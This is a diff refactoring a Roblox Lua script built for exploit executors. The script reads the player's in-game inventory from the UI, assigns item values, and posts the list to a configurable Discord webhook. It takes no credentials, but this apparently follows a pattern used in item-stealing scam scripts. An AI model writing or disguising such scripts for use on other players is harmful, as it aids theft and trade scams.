@@ -10,7 +10,8 @@ local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local Inventory = {}
 
-if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
+local UIPath
+if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
     UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
 else
     UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
@@ -208,41 +209,43 @@ local ItemValues = {
     ["Web"] = 1,
     ["Cavern (Gun)"] = 1,
 }
-    
 
-function checkitem(v)
-    if v:IsA("Frame") then
-        if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
+-- Function to format and add item to inventory list
+local function checkItem(itemFrame)
+    if itemFrame:IsA("Frame") then
+        local itemName = itemFrame.ItemName.Label.Text
+        if itemName ~= "Default Knife" and itemName ~= "Default Gun" then
             if Config.FullInventory then
-                local itemName = v.ItemName.Label.Text
-                local number = v.Container.Amount.Text ~= "" and v.Container.Amount.Text or "x1"
-                
-                -- Look up item value in ItemValues table
+                local number = itemFrame.Container.Amount.Text ~= "" and itemFrame.Container.Amount.Text or "x1"
                 local itemValue = ItemValues[itemName] or "Trash"
-                table.insert(Inventory, string.format("%s %s (Value: %s)", itemName, number, itemValue))
+                local formattedItem = string.format("%s %s (Value: %s)", itemName, number, itemValue)
+                table.insert(Inventory, formattedItem)
             end
         end
     end
 end
 
-local function FullInventory()
-    for _, v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
-        for _, v in pairs(v.Container:GetChildren()) do
-            if v.Name == "Christmas" or v.Name == "Halloween" then
-                for _, v in pairs(v.Container:GetChildren()) do
-                    checkitem(v)
+-- Function to gather all items from UI and format inventory
+local function gatherInventory()
+    -- Weapons Items
+    for _, weaponCategory in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
+        for _, weapon in pairs(weaponCategory.Container:GetChildren()) do
+            if weapon.Name == "Christmas" or weapon.Name == "Halloween" then
+                for _, specialItem in pairs(weapon.Container:GetChildren()) do
+                    checkItem(specialItem)
                 end
             else
-                checkitem(v)
+                checkItem(weapon)
             end
         end
     end
 
-    for _, v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
-        checkitem(v)
+    -- Pets Items
+    for _, petItem in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
+        checkItem(petItem)
     end
 
-    -- Format inventory list as bullet points
+    -- Format inventory list into bullet points
     local formattedInventory = {}
     for _, item in ipairs(Inventory) do
         table.insert(formattedInventory, "- " .. item)
@@ -250,18 +253,32 @@ local function FullInventory()
     return table.concat(formattedInventory, "\n")
 end
 
-FullInventory()
+-- Gather and format the inventory
+local inventoryData = gatherInventory()
 
-task.wait()
-
+-- Send formatted inventory to Discord
 local data = {
-    content = FullInventory()
+    content = inventoryData
 }
 
-local request = http_request or request or HttpPost or syn.request
-request({
-    Url = Config.Webhook,
-    Method = "POST",
-    Headers = { ["Content-Type"] = "application/json" },
-    Body = HttpService:JSONEncode(data)
-})
+-- Define the request function and handle errors
+local function sendToWebhook(data)
+    local request = http_request or request or HttpPost or syn.request
+    local success, response = pcall(function()
+        return request({
+            Url = Config.Webhook,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+
+    if not success then
+        warn("Failed to send inventory to webhook: " .. response)
+    else
+        print("Inventory successfully sent to webhook.")
+    end
+end
+
+-- Send the data to the webhook
+sendToWebhook(data)
